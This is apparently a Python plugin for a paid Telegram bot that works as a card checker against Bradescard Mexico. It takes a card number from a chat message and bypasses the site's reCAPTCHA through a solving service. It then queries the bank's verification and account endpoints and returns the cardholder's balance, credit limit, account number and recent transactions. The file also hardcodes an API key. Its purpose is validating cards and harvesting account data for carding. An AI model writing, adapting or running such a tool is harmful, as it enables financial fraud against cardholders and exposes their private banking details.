import requests
import os
import time
import re
import json
from pyrogram import filters
from pyromod import Client
from pyrogram.types import Message
from utils.config.db import Database
from utils.config.vars import PREFIXES

def procesar_contenido1(contenido):
    KEYS = "/#%&()=?¿!¡*[]{}-_.:,;|@+"
    for KEY in KEYS:
        contenido = contenido.replace(KEY, "|").replace(" ", "|")
    
    match = re.search(r'\d{16}', contenido)
    if not match:
        return None
    else:
        cc_number = match.group()  
        return cc_number

def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    response = requests.post('http://api.anti-captcha.com/createTask', json=data)
    result = response.json()

    if 'errorId' in result and result['errorId'] == 0:
        task_id = result['taskId']
        resolver_captcha

        while True:
            time.sleep(5)
            response = requests.post('http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
            if response.json()['status'] == 'ready':
                return response.json()['solution']['gRecaptchaResponse']
    else:

        error_message = result.get('errorDescription', 'Error desconocido al solicitar el captcha')

        raise Exception(f'Error de anti-captcha.com: {error_message}')
        

@Client.on_message(filters.command("brades", PREFIXES))
async def brades(client, message):
    user_id = message.from_user.id
    with Database() as db:
        if not db.is_authorized(user_id, message.chat.id):
            return await message.reply(
                "<b>Free user, nesesitas una membresia para usar este comando</b>",
            )

        user_info = db.get_info_user(user_id)
    credits = user_info.get("CREDITS", 0)
    if credits < 4:
        return await message.reply(
            "<b>Nesesitas credito para usar este comando</b>",
            quote=True,
        )


    cc_number = procesar_contenido1(message.text)

    user_id = message.from_user.id



    # En anti_captcha_api_key pondras tu key de https://anti-captcha.com/ ya solo recargas fondos.
    anti_captcha_api_key = '5fec3c316cce0048dea1f00a69dca9f3'
    sitekey = '6LdehgAVAAAAACpQnwTNpuZOiuyJfUg4Ug-9Tvjn'
    url_destino = 'https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3'

    mensaje_espera = await message.reply_text("<b>Chequeando, por favor espera...</b>")

    try:
        anticapt = resolver_captcha(anti_captcha_api_key, sitekey, url_destino)

        s = requests.Session()
        response = s.post(
            url='https://www.bradescard.com.mx/bradescard.net/Home/VerificaTarjeta',
            data={
                "token": anticapt,
                "tarjeta": cc_number,
                "terminos": True
            },
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
                "Origin": "https://www.bradescard.com.mx",
                "Referer": "https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3",
            }
        )

        if "No se pudo verificar la tarjeta, intente más tarde." in response.text or "success\":false" in response.text:
            message_to_send = f"Intenta Mas Tarde : {cc_number}"
            await mensaje_espera.edit_text(message_to_send)
        else:
            response = s.get(
                url= 'https://www.bradescard.com.mx/bradescard.net/',
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
                    "Referer": "https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3",
                }
            )
            
            numerotarjetacliente = re.search(r"numerotarjetacliente: '([^']+)'", response.text).group(1) if re.search(r"numerotarjetacliente: '([^']+)'", response.text) else None

            response = s.post(
                url = "https://www.bradescard.com.mx/bradescard.net/MasterPage/consultaResumenMovimientosPagoLinea",
                params = {
                    "numerotarjetacliente": numerotarjetacliente,
                },
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin": "https://www.bradescard.com.mx",
                    "Referer": "https://www.bradescard.com.mx/bradescard.net/",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
                    "X-Requested-With": "XMLHttpRequest"
                }
            )
            card_data = response.json()
            disponible_compras = card_data["DisponibleComprasPersona"]
            pago_minimo = card_data["PagoMinimoPersona"]
            saldo_total = card_data["SaldoTotalPersona"]
            pago_total_mes = card_data["PagoTotalMesPersona"]
            limite_credito = card_data["LimiteCreditoPersona"]
            fecha_limite_pago = card_data["FechaLimitePagoPersona"]
            fecha_corte = card_data["FechaCortePersona"]
            Numcuenta = card_data["NumCuentaPersona"]

            response = s.post(
                url="https://www.bradescard.com.mx/bradescard.net/MasterPage/ConsultaDatosMovimientosAntesCorte",
                data={"NumeroTarjeta": numerotarjetacliente, "periodo": "0"},
                headers={
                    "Host": "www.bradescard.com.mx",
                    "Origin": "https://www.bradescard.com.mx/",
                    "Referer": "https://www.bradescard.com.mx/bradescard.net/",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
                }
            )

            data = response.json()
            movimientos_output = ""
            if not data.get('status', True):
                movimientos_output = "𝗡𝗼 𝗲𝘅𝗶𝘀𝘁𝗲𝗻 𝗺𝗼𝘃𝗶𝗺𝗶𝗲𝗻𝘁𝗼𝘀"
            else:
                movimientos = json.loads(data.get("movimientos", "[]"))
                no_movimientos = True

                for item in movimientos:
                    if 'FechaRegistro' in item:
                        no_movimientos = False
                        movimientos_output += f"Fecha: {item['FechaRegistro']}\nMonto: ${item['Monto']} MXN\nDescripcion: {item['Descripcion']}\n\n"
                        movimientos_output += "━━━━━━━━━━━━━\n\n"

                if no_movimientos:
                    movimientos_output = "𝗡𝗼 𝗲𝘅𝗶𝘀𝘁𝗲𝗻 𝗺𝗼𝘃𝗶𝗺𝗶𝗲𝗻𝘁𝗼𝘀"
                else:
                    movimientos_output = movimientos_output.rstrip("━━━━━━━━━━━━━\n\n")

            db.remove_credits(user_id, credits=2)

            message_to_send = f"""
Card: <code>{cc_number}<code>
Status: Aprobada ✅
━━━━━━━━━━━━━
Pago Mínimo: <code>{pago_minimo}</code>
Pago del Mes: <code>{pago_total_mes}</code>
Total/Pago: <code>{saldo_total}</code>
Disponible para Compras: <code>{disponible_compras}</code>
Límite de Crédito: `{limite_credito}</code>
Fecha Límite de Pago: <code>{fecha_limite_pago}</code>
Fecha de Corte: <code>{fecha_corte}</code>
Número de Cuenta: <code>{Numcuenta}</code>
━━━━━ Movimientos ━━━━━
{movimientos_output}
━━━━━━━━━━━━━
"""
            


            await mensaje_espera.edit_text(message_to_send)

    except Exception as e:
        error_message = f'Error: {str(e)}'
        await mensaje_espera.edit_text(error_message)

